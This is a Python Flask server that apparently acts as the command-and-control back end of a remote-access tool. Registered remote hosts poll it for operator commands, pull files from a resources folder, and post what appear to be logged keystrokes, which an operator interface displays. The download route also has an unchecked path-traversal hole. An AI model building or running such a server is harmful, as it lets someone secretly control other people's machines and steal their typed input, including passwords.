from flask import Flask, request, send_file, render_template, Response
import os, time
import requests
import threading
import sse

app = Flask(__name__)

hosts = {}

#host routes
@app.route('/handshake', methods = ['POST'])
def handshake():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key] = {'lock' : threading.Lock(), 'command' : '', 'ping' : '', 'log' : ['']}
  hosts[key]['lock'].acquire()
  return 'Request accepted' 

@app.route('/download', methods = ['POST'])
def download():
  file = request.form['file']
  path = './resources/' + file
  if os.path.exists(path):
    return send_file(path, as_attachment = True)
  else:
    return 'File not found', 404

@app.route('/ready', methods = ['POST'])
def timeout():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['lock'].acquire()
  return hosts[key]['command']

@app.route('/pong', methods = ['POST'])
def pong():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['ping'] = 'Pong'
  return 'Ok', 200

@app.route('/log', methods = ['POST'])
def log_post():
  global hosts
  key = (request.remote_addr, request.form['name'])
  hosts[key]['log'].append(request.form['key'])
  return 'Ok', 200

#interface routes
@app.route('/')
def displayHosts():
  global hosts
  keys = hosts.keys()
  return render_template('index.html', keys = keys)

@app.route('/send', methods = ['GET'])
def send_form():
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')
  return render_template('form.html', name = name, ip = ip, status = hosts[(ip, name)]['ping'])

@app.route('/send', methods = ['POST'])
def send_process():
  global hosts
  name = request.args.get('name')
  ip = request.args.get('ip')
  key = (ip, name)
  command = request.form['command'] 
  if command == 'ping':
    hosts[key]['ping'] = 'Not pong.'
  if command == 'log':
    return render_template('log.html', name = name, ip = ip)
  hosts[key]['command'] = command
  if hosts[key]['lock'].locked():
    hosts[key]['lock'].release()
  else:
    return 'Host offline'
  time.sleep(2)
  return render_template('form.html', name = name, ip = ip, status = hosts[key]['ping'])

@app.route('/getLog', methods = ['POST'])
def getLog():
  global hosts
  name = request.form['name']
  ip = request.form['ip']
  key = (ip, name)
  return ''.join(hosts[key]['log'])